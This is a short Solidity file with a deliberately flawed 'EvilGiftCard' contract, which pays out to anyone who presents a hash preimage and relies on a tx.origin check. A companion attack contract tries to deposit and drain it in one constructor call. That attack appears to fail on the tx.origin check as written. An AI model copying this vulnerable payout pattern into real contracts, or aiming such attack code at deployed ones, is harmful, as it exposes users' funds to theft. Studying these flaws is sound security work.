// own work
pragma solidity ^0.4.24;

contract EvilGiftCard {
    bytes32 hash;
    
    function put(bytes32 _hash) public payable {
        require(msg.value >= 1 ether);
        hash = _hash;
    }
    
    function take(bytes password) public {
        require(keccak256(password) == hash && msg.sender == tx.origin);
        msg.sender.transfer(address(this).balance);
    }
}

contract EvilGiftCardAttack {
    bytes password = "anything";
    constructor(EvilGiftCard giftCard) payable public {
        giftCard.put.value(msg.value)(keccak256(password));
        giftCard.take(password);
        require(address(this).balance > msg.value);
        selfdestruct(msg.sender);
    }
}
